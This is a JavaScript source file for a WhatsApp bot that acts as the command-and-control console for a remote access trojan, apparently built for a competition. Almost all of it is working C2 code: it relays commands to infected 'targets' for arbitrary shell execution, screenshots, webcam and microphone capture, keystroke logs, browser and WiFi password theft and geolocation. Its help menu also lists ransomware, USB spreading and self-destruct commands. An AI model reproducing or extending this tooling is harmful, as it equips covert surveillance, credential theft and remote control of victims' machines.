const { default: makeWASocket, DisconnectReason, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const io = require('socket.io-client');

// Connect to Python RAT server
const socket = io('http://localhost:5000');

let sock;
let activeSessions = {};
let currentSession = null;
let authorizedNumbers = []; // Will be populated on first message

console.log(`
╔═══════════════════════════════════════════════════════════════╗
║         WHATSAPP RAT C2 CONTROL - COMPETITION EDITION         ║
║              Control Your RATs via WhatsApp!                  ║
╚═══════════════════════════════════════════════════════════════╝
`);

async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
    
    sock = makeWASocket({
        auth: state,
        printQRInTerminal: true
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr) {
            console.log('\n📱 Scan this QR code with WhatsApp:');
            qrcode.generate(qr, { small: true });
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log('Connection closed. Reconnecting:', shouldReconnect);
            if (shouldReconnect) {
                connectToWhatsApp();
            }
        } else if (connection === 'open') {
            console.log('✅ WhatsApp Connected Successfully!');
            console.log('📱 Send a message to authorize your number');
        }
    });

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message) return;
        
        const from = msg.key.remoteJid;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
        
        // Auto-authorize first number that messages
        if (authorizedNumbers.length === 0) {
            authorizedNumbers.push(from);
            await sock.sendMessage(from, { 
                text: `✅ *WhatsApp RAT C2 Authorized*\n\n` +
                      `Your number is now authorized to control targets.\n\n` +
                      `*Commands:*\n` +
                      `📋 /sessions - List all targets\n` +
                      `🎯 /use <id> - Select target\n` +
                      `💻 /cmd <command> - Execute command\n` +
                      `📸 /screenshot - Capture screen\n` +
                      `📷 /webcam - Capture webcam\n` +
                      `🔑 /passwords - Steal passwords\n` +
                      `📡 /wifi - Get WiFi passwords\n` +
                      `📊 /sysinfo - System info\n` +
                      `🔄 /processes - List processes\n` +
                      `💾 /download <path> - Download file\n` +
                      `🎤 /record <sec> - Record audio\n` +
                      `⌨️ /keylogs - Get keystrokes\n` +
                      `📍 /locate - Get location\n` +
                      `💀 /ransom <path> - Ransomware demo\n` +
                      `🔥 /spread - USB spreading\n` +
                      `🌐 /netscan - Network scan\n` +
                      `💣 /selfdestruct - Remove traces\n` +
                      `❓ /help - Show commands`
            });
            return;
        }

        // Check authorization
        if (!authorizedNumbers.includes(from)) {
            await sock.sendMessage(from, { text: '❌ Unauthorized' });
            return;
        }

        // Handle commands
        await handleCommand(from, text);
    });
}

async function handleCommand(from, text) {
    const cmd = text.toLowerCase().trim();

    // Sessions command
    if (cmd === '/sessions') {
        socket.emit('get_sessions');
        socket.once('sessions_list', async (sessions) => {
            if (Object.keys(sessions).length === 0) {
                await sock.sendMessage(from, { text: '📭 No active targets' });
                return;
            }

            let response = '*🎯 Active Targets:*\n\n';
            for (const [id, session] of Object.entries(sessions)) {
                response += `*[${id}]* ${session.info}\n`;
                response += `└ IP: ${session.addr[0]}\n`;
                response += `└ Connected: ${session.connected_at}\n\n`;
            }
            await sock.sendMessage(from, { text: response });
        });
    }

    // Use session
    else if (cmd.startsWith('/use ')) {
        const sessionId = parseInt(cmd.split(' ')[1]);
        currentSession = sessionId;
        await sock.sendMessage(from, { 
            text: `✅ *Target ${sessionId} Selected*\n\nSend commands with /cmd <command>` 
        });
    }

    // Execute command
    else if (cmd.startsWith('/cmd ')) {
        if (!currentSession) {
            await sock.sendMessage(from, { text: '❌ No target selected. Use /use <id> first' });
            return;
        }

        const command = text.substring(5);
        socket.emit('execute_command', { session: currentSession, command: command });
        
        await sock.sendMessage(from, { text: `⏳ Executing: ${command}` });

        socket.once('command_result', async (data) => {
            const result = data.result.length > 4000 ? 
                data.result.substring(0, 4000) + '\n\n[Truncated...]' : 
                data.result;
            await sock.sendMessage(from, { text: `📤 *Result:*\n\`\`\`${result}\`\`\`` });
        });
    }

    // Screenshot
    else if (cmd === '/screenshot') {
        if (!currentSession) {
            await sock.sendMessage(from, { text: '❌ No target selected' });
            return;
        }

        socket.emit('execute_command', { session: currentSession, command: 'screenshot' });
        await sock.sendMessage(from, { text: '📸 Taking screenshot...' });

        socket.once('command_result', async (data) => {
            if (data.image) {
                const buffer = Buffer.from(data.image, 'base64');
                await sock.sendMessage(from, {
                    image: buffer,
                    caption: `📸 Screenshot from Target ${currentSession}`
                });
            } else {
                await sock.sendMessage(from, { text: `❌ ${data.result}` });
            }
        });
    }

    // Webcam
    else if (cmd === '/webcam') {
        if (!currentSession) {
            await sock.sendMessage(from, { text: '❌ No target selected' });
            return;
        }

        socket.emit('execute_command', { session: currentSession, command: 'webcam' });
        await sock.sendMessage(from, { text: '📷 Capturing webcam...' });

        socket.once('command_result', async (data) => {
            if (data.image) {
                const buffer = Buffer.from(data.image, 'base64');
                await sock.sendMessage(from, {
                    image: buffer,
                    caption: `📷 Webcam from Target ${currentSession}`
                });
            } else {
                await sock.sendMessage(from, { text: `❌ ${data.result}` });
            }
        });
    }

    // Passwords
    else if (cmd === '/passwords') {
        if (!currentSession) {
            await sock.sendMessage(from, { text: '❌ No target selected' });
            return;
        }

        socket.emit('execute_command', { session: currentSession, command: 'passwords' });
        await sock.sendMessage(from, { text: '🔑 Harvesting passwords...' });

        socket.once('command_result', async (data) => {
            await sock.sendMessage(from, { text: `🔑 *Passwords:*\n\`\`\`${data.result}\`\`\`` });
        });
    }

    // WiFi
    else if (cmd === '/wifi') {
        if (!currentSession) {
            await sock.sendMessage(from, { text: '❌ No target selected' });
            return;
        }

        socket.emit('execute_command', { session: currentSession, command: 'wifi' });
        await sock.sendMessage(from, { text: '📡 Getting WiFi passwords...' });

        socket.once('command_result', async (data) => {
            await sock.sendMessage(from, { text: `📡 *WiFi Passwords:*\n\`\`\`${data.result}\`\`\`` });
        });
    }

    // Sysinfo
    else if (cmd === '/sysinfo') {
        if (!currentSession) {
            await sock.sendMessage(from, { text: '❌ No target selected' });
            return;
        }

        socket.emit('execute_command', { session: currentSession, command: 'sysinfo' });

        socket.once('command_result', async (data) => {
            await sock.sendMessage(from, { text: `📊 *System Info:*\n\`\`\`${data.result}\`\`\`` });
        });
    }

    // Processes
    else if (cmd === '/processes') {
        if (!currentSession) {
            await sock.sendMessage(from, { text: '❌ No target selected' });
            return;
        }

        socket.emit('execute_command', { session: currentSession, command: 'processes' });
        await sock.sendMessage(from, { text: '🔄 Listing processes...' });

        socket.once('command_result', async (data) => {
            const result = data.result.length > 4000 ? 
                data.result.substring(0, 4000) + '\n[Truncated...]' : 
                data.result;
            await sock.sendMessage(from, { text: `🔄 *Processes:*\n\`\`\`${result}\`\`\`` });
        });
    }

    // Keylogs
    else if (cmd === '/keylogs') {
        if (!currentSession) {
            await sock.sendMessage(from, { text: '❌ No target selected' });
            return;
        }

        socket.emit('execute_command', { session: currentSession, command: 'keylogs' });

        socket.once('command_result', async (data) => {
            await sock.sendMessage(from, { text: `⌨️ *Keystrokes:*\n\`\`\`${data.result}\`\`\`` });
        });
    }

    // Record audio
    else if (cmd.startsWith('/record ')) {
        if (!currentSession) {
            await sock.sendMessage(from, { text: '❌ No target selected' });
            return;
        }

        const duration = cmd.split(' ')[1] || '5';
        socket.emit('execute_command', { session: currentSession, command: `record ${duration}` });
        await sock.sendMessage(from, { text: `🎤 Recording ${duration} seconds of audio...` });

        socket.once('command_result', async (data) => {
            if (data.audio) {
                const buffer = Buffer.from(data.audio, 'base64');
                await sock.sendMessage(from, {
                    audio: buffer,
                    mimetype: 'audio/wav',
                    caption: `🎤 Audio from Target ${currentSession}`
                });
            } else {
                await sock.sendMessage(from, { text: `❌ ${data.result}` });
            }
        });
    }

    // Locate
    else if (cmd === '/locate') {
        if (!currentSession) {
            await sock.sendMessage(from, { text: '❌ No target selected' });
            return;
        }

        socket.emit('execute_command', { session: currentSession, command: 'locate' });
        await sock.sendMessage(from, { text: '📍 Getting location...' });

        socket.once('command_result', async (data) => {
            await sock.sendMessage(from, { text: `📍 *Location:*\n\`\`\`${data.result}\`\`\`` });
        });
    }

    // Help
    else if (cmd === '/help') {
        await sock.sendMessage(from, { 
            text: `*📱 WhatsApp RAT Commands:*\n\n` +
                  `*Target Management:*\n` +
                  `/sessions - List targets\n` +
                  `/use <id> - Select target\n\n` +
                  `*Surveillance:*\n` +
                  `/screenshot - Screen capture\n` +
                  `/webcam - Webcam capture\n` +
                  `/keylogs - Keystrokes\n` +
                  `/record <sec> - Audio\n\n` +
                  `*Credentials:*\n` +
                  `/passwords - Browser passwords\n` +
                  `/wifi - WiFi passwords\n\n` +
                  `*System:*\n` +
                  `/sysinfo - System info\n` +
                  `/processes - Process list\n` +
                  `/cmd <command> - Shell command\n` +
                  `/locate - Geolocation\n\n` +
                  `*Advanced:*\n` +
                  `/ransom <path> - Ransomware demo\n` +
                  `/spread - USB spreading\n` +
                  `/netscan - Network scan\n` +
                  `/selfdestruct - Remove traces`
        });
    }

    // Unknown command
    else if (text.startsWith('/')) {
        await sock.sendMessage(from, { text: '❓ Unknown command. Send /help for commands' });
    }
}

// Socket.IO connection events
socket.on('connect', () => {
    console.log('✅ Connected to RAT server');
});

socket.on('disconnect', () => {
    console.log('❌ Disconnected from RAT server');
});

// Start WhatsApp connection
connectToWhatsApp();